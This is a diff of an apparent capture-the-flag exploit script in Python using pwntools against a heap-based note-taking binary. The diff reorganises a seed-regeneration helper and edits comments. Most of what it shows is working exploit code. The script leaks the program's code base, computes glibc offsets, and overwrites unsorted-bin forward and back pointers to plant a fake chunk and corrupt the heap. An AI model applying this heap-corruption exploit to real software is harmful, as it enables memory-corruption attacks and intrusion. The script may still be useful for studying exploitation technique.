@@ -38,12 +38,6 @@ def Delete(idx):
 seed = [0] * 17
 rotate = lambda v, b: (v >> (32 - b)) | (v << b)
 
-def q(x):
-    var8 = x & 0xffff
-    varC = x >> 16
-    var10 = ((var8 * varC) + (var8 * var8 >> 17) >> 15) + (varC * varC)
-    return (var10 ^ x * x) & 0xffffffff
-
 def regen_seed():
     tmp = [seed[i + 8] for i in range(8)]
     seed[8] += seed[16] + 0x4D34D34D;
@@ -65,7 +59,13 @@ def regen_seed():
     seed[16] = seed[15] < tmp[7];
     seed[16] &= 0xffffffff
 
-    tmp2 = [q((seed[i + 8] + seed[i])&0xffffffff) for i in range(8)]
+    def q(x):
+        var8 = x & 0xffff
+        varC = x >> 16
+        var10 = ((var8 * varC) + (var8 * var8 >> 17) >> 15) + (varC * varC)
+        return (var10 ^ x * x) & 0xffffffff
+
+    tmp2 = [q((seed[i + 8] + seed[i]) & 0xffffffff) for i in range(8)]
 
     v3 = tmp2[0]
     v4 = (rotate(tmp2[7], 16) + v3) & 0xffffffff
@@ -155,7 +155,6 @@ name = "egoe"
 r.sendline(name)
 r.recvlines(3)
 
-
 # leak code base
 New("A" * 0x80, "A" * 0x180, -1234567890)
 leak = decrypt(View(0))[0x200:]
@@ -190,14 +189,11 @@ assert("\n" not in fake_bin)
 Edit(0, fake_bin)
 View(0)
 
-# Fix chunk meta of #1
-Edit(0, "A" * 0x200 + p64(0) + p64(0x211))
-
 # current unsorted bins: libc<->+0x210<->+0x630<->libc
 
 # overwrite +0x210 to corrupt unsorted bins
-# unsorted bins: libc<-fake<->+0x210<->libc
-#                libc<->0x630<->libc
+# unsorted bins: libc<- fake<->+0x210<->libc
+#                              +0x210<- 0x630<->libc
 fd = libc_base + 0x3c3b78
 bk = code_base + 0x205a40 + (512-32) # our fake chunk in output buffer
 Edit(0, "A" * 0x200 + flat(0, 0x211, fd, bk))
